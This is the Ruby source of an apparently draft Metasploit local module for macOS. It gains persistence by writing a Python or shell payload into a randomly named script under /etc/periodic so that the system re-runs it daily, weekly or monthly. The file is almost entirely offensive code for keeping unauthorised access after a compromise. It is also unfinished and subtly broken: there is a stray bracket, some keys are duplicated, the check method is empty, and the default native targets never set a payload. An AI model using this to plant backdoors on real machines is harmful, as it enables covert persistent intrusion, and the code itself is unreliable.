##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# todo /etc/periodic is owned by root thus we need to make sure that anyone running the module has root permissions. 
# binaries should be written to a randomized folder, made executable and then ran from the script
# cmd/unix payloads can just run from a file in script dir

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OSX Periodic Script Persistence',
        'Description' => %q{
          This module will achieve persistence by writing a script to the /etc/periodic directory. According to The
          Art of Mac Malware no such malware species persist in this manner (2024).    
        },
        'License' => MSF_LICENSE,
        'Author' => 'gardnerapp',
        'References' => [
          [ 'URL', 'https://taomm.org/vol1/pdfs/CH%202%20Persistence.pdf',
            'URL', 'https://superuser.com/questions/391204/what-is-the-difference-between-periodic-and-cron-on-os-x/' ]
        ],
        'Platform' => 'osx',
         'Targets' => [
          [ 'Mac OS X x64 (Native Payload)', { 'Arch' => ARCH_X64, 'Platform' => [ 'osx' ] } ],
          [ 'Mac OS X x86 (Native Payload for 10.14 and earlier)', { 'Arch' => ARCH_X86, 'Platform' => [ 'osx' ] } ],
          [ 'Python payload', { 'Arch' => ARCH_PYTHON, 'Platform' => [ 'python' ] } ],
          [ 'Command payload', { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ] } ],
        ],
        'DefaultTarget' => 0,
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'DisclosureDate' => '2012-04-01',
        'Platform' => [ 'osx', 'python', 'unix' ]
        ],
        'Payload' => {
        },
        'Privileged' => true,
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        },
      )
    )

    register_options([
      OptEnum.new('PERIODIC_DIR', [true, 'Periodic Directory to write script eg. /etc/periodic/daily', 'daily', %w[daily weekly monthly]]),
      OptString.new('SCRIPT_NAME', [false, 'Name of script'])
    ])
  end

  def check; end # todo make sure osx, make sure root
  # check for block block and exit on AV??s

  # todo add binary payload support by writing file then having script trigger it

  def exploit
    dir = "/etc/periodic/#{datastore['PERIODIC_DIR']}/"

    script = datastore['SCRIPT_NAME']
    script ||= Rex::Text.rand_text_alphanumeric(rand(6..13))

    script = dir + script

    if target['Arch'] == ARCH_PYTHON
      payload_bin = "#!/usr/bin/env python\n" + payload.encoded
    elsif target['Arch'] == ARCH_CMD
      payload_bin = "#!/usr/bin/env bash\n" + payload.raw
    end 

    if write_file(script, payload_bin)
      print_good("Writing payload to #{script}")
    else
      fail_with(Failure::UnexpectedReply, "Unable to write payload to #{script}")
    end 
  end
end
